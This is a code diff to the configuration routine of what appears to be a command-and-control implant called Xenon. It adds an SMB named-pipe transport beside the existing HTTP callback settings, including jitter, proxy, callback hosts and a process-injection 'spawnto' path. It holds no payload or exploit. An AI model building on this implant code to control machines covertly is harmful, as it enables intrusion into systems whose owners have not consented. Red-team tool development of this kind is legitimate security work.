@@ -31,6 +31,7 @@ VOID XenonConfigure()
     SIZE_T proxyLen     = 0;
     SIZE_T userLen      = 0;
     SIZE_T passLen      = 0;
+    SIZE_T namedPipeLen = 0;
 
     ParserNew(&ParserConfig, (PBYTE)AgentConfig, sizeof(AgentConfig));
     RtlSecureZeroMemory(AgentConfig, sizeof(AgentConfig));
@@ -42,6 +43,9 @@ VOID XenonConfigure()
     {
         xenonConfig->aesKey          = ParserStringCopy(&ParserConfig, &keyLen);                     // allocates
     }
+
+#ifdef HTTPX_TRANSPORT
+
     xenonConfig->isProxyEnabled      = ParserGetByte(&ParserConfig);
     if (xenonConfig->isProxyEnabled)
     {
@@ -53,9 +57,14 @@ VOID XenonConfigure()
     xenonConfig->jitter              = ParserGetInt32(&ParserConfig);
     xenonConfig->rotationStrategy    = ParserGetInt32(&ParserConfig);
     xenonConfig->failoverThreshold   = ParserGetInt32(&ParserConfig);
+
+#endif
+
     // Process Injection Options
     xenonConfig->spawnto           = ParserStringCopy(&ParserConfig, &pathLen);                     // allocates
     xenonConfig->pipename          = ParserStringCopy(&ParserConfig, &pipeLen);                     // allocates
+
+#ifdef HTTPX_TRANSPORT
 
     // Connection Hosts
     UINT32 NmbrOfHosts = ParserGetInt32(&ParserConfig);
@@ -102,21 +111,41 @@ VOID XenonConfigure()
         hostnameLen = 0;
     }
 
+#endif
+
+#ifdef SMB_TRANSPORT
+
+    // Named Pipe Comms
+    xenonConfig->SmbPipe           = NULL;
+    xenonConfig->SmbPipename       = ParserStringCopy(&ParserConfig, &namedPipeLen);                     // allocates
+
+#endif
+
     // DEBUG Print Values
     _dbg("AGENT CONFIGURATION VALUES: \n");
 
     _dbg("[InitUUID]            = %s", xenonConfig->agentID);
     _dbg("[ENCRYPTION]          = %s", xenonConfig->isEncryption ? "TRUE" : "FALSE");
     _dbg("[AesEncrpytionKey]    = %s", xenonConfig->aesKey);
+
+#ifdef HTTPX_TRANSPORT
+
     _dbg("[ProxyEnabled]        = %s", xenonConfig->isProxyEnabled ? "TRUE" : "FALSE");
     _dbg("[RotationStrat]       = %d", xenonConfig->rotationStrategy);
     _dbg("[FailoverThreshold]   = %d", xenonConfig->failoverThreshold);
     _dbg("[SleepTime]           = %d", xenonConfig->sleeptime);
     _dbg("[Jitter]              = %d", xenonConfig->jitter);
-
     _dbg("[hostname]            = %s", xenonConfig->CallbackDomains->hostname);
     _dbg("[port]                = %d", xenonConfig->CallbackDomains->port);
     _dbg("[SSL]                 = %s", xenonConfig->CallbackDomains->isSSL ? "TRUE" : "FALSE");
+
+#endif
+
+#ifdef SMB_TRANSPORT
+
+    _dbg("[SmbPipename]    = %s", xenonConfig->SmbPipename);
+    
+#endif
 
 }
 
